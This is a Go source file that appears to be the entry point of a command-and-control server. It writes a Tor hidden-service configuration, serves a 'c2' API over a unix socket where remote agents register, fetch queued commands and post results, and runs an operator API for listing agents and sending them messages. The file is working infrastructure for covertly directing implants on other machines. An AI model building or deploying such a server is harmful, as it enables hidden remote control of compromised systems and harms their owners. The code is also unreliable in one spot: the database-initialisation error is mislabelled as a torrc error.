package main

import (
	"api/config"
	"api/ctrl/apictrl"
	"api/ctrl/c2ctrl"
	"api/db"
	"flag"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
)

func main() {
	flag.Parse()

	if len(*config.ApiSockPath) == 0 {
		fmt.Println("api sock path is not specified")
		os.Exit(1)
	}
	if !strings.HasSuffix(*config.ApiSockPath, ".sock") {
		fmt.Println("api sock path must have '.sock' suffix")
		os.Exit(1)
	}
	if len(*config.ApiSecretKey) < 16 {
		fmt.Println("api key too insecure or not provided, must be greater than 16 chars")
		os.Exit(1)
	}

	os.RemoveAll(*config.ApiSockPath)

	if err := writeTorrcConfig(config.ApiSockPath, config.OnionServicePath); err != nil {
		fmt.Println("error: writeTorrcConfig:", err)
		os.Exit(1)
	}

	if err := db.Init(*config.DbPath); err != nil {
		fmt.Println("error: writeTorrcConfig:", err)
		os.Exit(1)
	}

	go func() {
		if err := startOnionService(config.ApiSockPath); err != nil {
			fmt.Println("error: startOnionService:", err)
			os.Exit(1)
		}
	}()

	if err := startUserFacingService(config.ApiHost); err != nil {
		fmt.Println("error: startUserFacingService:", err)
		os.Exit(1)
	}
}

func writeTorrcConfig(apiSockPath, onionServiceDirPath *string) (err error) {
	torrc := "HiddenServiceDir " + *onionServiceDirPath
	torrc += "\nHiddenServicePort 80 unix:" + *apiSockPath

	return os.WriteFile("torrc", []byte(torrc), 0666)
}

func startUserFacingService(apiHost *string) (err error) {
	router := http.NewServeMux()

	router.HandleFunc("GET /v1/agents", apictrl.GetAgents)
	router.HandleFunc("GET /v1/messages/{agentID}", apictrl.GetMessages)
	router.HandleFunc("POST /v1/messages", apictrl.InsertMessage)

	server := &http.Server{
		Handler: router,
		Addr:    *apiHost,
	}

	log.Println("user api listening at:", *apiHost)

	if err := server.ListenAndServe(); err != nil {
		return err
	}

	return nil
}

func startOnionService(apiSockPath *string) (err error) {
	router := http.NewServeMux()

	router.HandleFunc("GET /v1/{agentID}", c2ctrl.GetMessages)
	router.HandleFunc("POST /v1", c2ctrl.InsertMessageResponse)
	router.HandleFunc("PUT /v1", c2ctrl.InsertAgent)

	listener, err := net.Listen("unix", *apiSockPath)
	if err != nil {
		return err
	}
	defer listener.Close()

	if err := os.Chmod(*apiSockPath, 0666); err != nil {
		return err
	}

	server := &http.Server{
		Handler: router,
	}

	log.Println("c2 listening at:", *apiSockPath)

	if err := server.Serve(listener); err != nil {
		return err
	}

	return nil
}
